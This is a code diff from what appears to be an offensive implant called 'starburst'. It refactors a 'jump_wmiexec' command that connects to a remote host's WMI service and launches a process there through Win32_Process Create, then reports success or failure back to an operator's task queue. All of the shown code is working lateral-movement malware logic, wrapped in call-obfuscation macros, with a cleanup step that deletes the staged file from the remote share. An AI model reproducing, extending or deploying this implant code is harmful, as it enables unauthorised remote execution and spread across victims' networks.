@@ -17,7 +17,7 @@ static const GUID IID_IWbemLocator     = { 0xdc12a687, 0x737f, 0x11cf, { 0x88, 0
 
 typedef HRESULT (WINAPI *fnCoInitializeEx)( LPVOID, DWORD );
 typedef void    (WINAPI *fnCoUninitialize)( void );
-typedef HRESULT (WINAPI *fnCoCreateInstance)( REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID* );
+typedef HRESULT (WINAPI *fnCoCreateInstance)( const CLSID*, LPUNKNOWN, DWORD, const IID*, LPVOID* );
 typedef HRESULT (WINAPI *fnCoInitializeSecurity)( PSECURITY_DESCRIPTOR, LONG, void*, void*, DWORD, DWORD, void*, DWORD, void* );
 typedef HRESULT (WINAPI *fnCoSetProxyBlanket)( IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD, RPC_AUTH_IDENTITY_HANDLE, DWORD );
 
@@ -184,7 +184,7 @@ auto declfn starburst::cmd_jump_wmiexec(
     HRESULT hr = (HRESULT)SCALL_PTR( inst, pCoInitializeEx, nullptr, 0 );
 
     if ( pCoInitializeSecurity ) {
-        SCALL_PTR( inst, pCoInitializeSecurity, nullptr, -1, nullptr, nullptr, 4, 3, nullptr, 0, nullptr );
+        SCALL_PTR_VOID( inst, pCoInitializeSecurity, nullptr, -1, nullptr, nullptr, 4, 3, nullptr, 0, nullptr );
     }
 
     wchar_t ns[512] = { '\\', '\\', 0 };
@@ -197,9 +197,9 @@ auto declfn starburst::cmd_jump_wmiexec(
     ns[ns_idx] = 0;
 
     IWbemLocator_s* pLoc = nullptr;
-    hr = (HRESULT)SCALL_PTR( inst, pCoCreateInstance, CLSID_WbemLocator, nullptr, 1, IID_IWbemLocator, reinterpret_cast<void**>( &pLoc ) );
+    hr = (HRESULT)SCALL_PTR( inst, pCoCreateInstance, &CLSID_WbemLocator, nullptr, 1, &IID_IWbemLocator, reinterpret_cast<void**>( &pLoc ) );
     if ( FAILED( hr ) || !pLoc ) {
-        SCALL_PTR( inst, pCoUninitialize );
+        SCALL_PTR_VOID( inst, pCoUninitialize );
         SCALL( inst, kernel32.DeleteFileW, w_unc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "CoCreateInstance WbemLocator failed" ) ) );
@@ -209,11 +209,11 @@ auto declfn starburst::cmd_jump_wmiexec(
     BSTR bstr_ns = (BSTR)SCALL_PTR( inst, pSysAllocString, ns );
     IWbemServices_s* pSvc = nullptr;
     hr = pLoc->lpVtbl->ConnectServer( pLoc, bstr_ns, nullptr, nullptr, 0, 0, nullptr, nullptr, reinterpret_cast<void**>( &pSvc ) );
-    SCALL_PTR( inst, pSysFreeString, bstr_ns );
+    SCALL_PTR_VOID( inst, pSysFreeString, bstr_ns );
 
     if ( FAILED( hr ) || !pSvc ) {
         pLoc->lpVtbl->Release( pLoc );
-        SCALL_PTR( inst, pCoUninitialize );
+        SCALL_PTR_VOID( inst, pCoUninitialize );
         SCALL( inst, kernel32.DeleteFileW, w_unc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "ConnectServer failed - check perms/network" ) ) );
@@ -228,10 +228,10 @@ auto declfn starburst::cmd_jump_wmiexec(
     IWbemClassObject_s* pClass = nullptr;
     hr = pSvc->lpVtbl->GetObject( pSvc, bstr_class, 0, nullptr, reinterpret_cast<void**>( &pClass ), nullptr );
     if ( FAILED( hr ) || !pClass ) {
-        SCALL_PTR( inst, pSysFreeString, bstr_class );
+        SCALL_PTR_VOID( inst, pSysFreeString, bstr_class );
         pSvc->lpVtbl->Release( pSvc );
         pLoc->lpVtbl->Release( pLoc );
-        SCALL_PTR( inst, pCoUninitialize );
+        SCALL_PTR_VOID( inst, pCoUninitialize );
         SCALL( inst, kernel32.DeleteFileW, w_unc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "GetObject Win32_Process failed" ) ) );
@@ -244,12 +244,12 @@ auto declfn starburst::cmd_jump_wmiexec(
     IWbemClassObject_s* pInParams = nullptr;
     hr = pClass->lpVtbl->GetMethod( pClass, bstr_method, 0, reinterpret_cast<void**>( &pInParams ), nullptr );
     if ( FAILED( hr ) || !pInParams ) {
-        SCALL_PTR( inst, pSysFreeString, bstr_method );
-        SCALL_PTR( inst, pSysFreeString, bstr_class );
+        SCALL_PTR_VOID( inst, pSysFreeString, bstr_method );
+        SCALL_PTR_VOID( inst, pSysFreeString, bstr_class );
         pClass->lpVtbl->Release( pClass );
         pSvc->lpVtbl->Release( pSvc );
         pLoc->lpVtbl->Release( pLoc );
-        SCALL_PTR( inst, pCoUninitialize );
+        SCALL_PTR_VOID( inst, pCoUninitialize );
         SCALL( inst, kernel32.DeleteFileW, w_unc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "GetMethod Create failed" ) ) );
@@ -275,15 +275,15 @@ auto declfn starburst::cmd_jump_wmiexec(
     var.bstrVal = bstr_val;
 
     hr = pPut( pInInst, bstr_cl, 0, &var, 0 );
-    SCALL_PTR( inst, pSysFreeString, bstr_cl );
+    SCALL_PTR_VOID( inst, pSysFreeString, bstr_cl );
 
     IWbemClassObject_s* pOutParams = nullptr;
     hr = pSvc->lpVtbl->ExecMethod( pSvc, bstr_class, bstr_method, 0, nullptr,
         pInInst, reinterpret_cast<void**>( &pOutParams ), nullptr );
 
-    SCALL_PTR( inst, pSysFreeString, bstr_val );
-    SCALL_PTR( inst, pSysFreeString, bstr_method );
-    SCALL_PTR( inst, pSysFreeString, bstr_class );
+    SCALL_PTR_VOID( inst, pSysFreeString, bstr_val );
+    SCALL_PTR_VOID( inst, pSysFreeString, bstr_method );
+    SCALL_PTR_VOID( inst, pSysFreeString, bstr_class );
 
     if ( pOutParams ) pOutParams->lpVtbl->Release( pOutParams );
     if ( pInInst )    pInInst->lpVtbl->Release( pInInst );
@@ -291,7 +291,7 @@ auto declfn starburst::cmd_jump_wmiexec(
     pClass->lpVtbl->Release( pClass );
     pSvc->lpVtbl->Release( pSvc );
     pLoc->lpVtbl->Release( pLoc );
-    SCALL_PTR( inst, pCoUninitialize );
+    SCALL_PTR_VOID( inst, pCoUninitialize );
 
     if ( SUCCEEDED( hr ) ) {
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
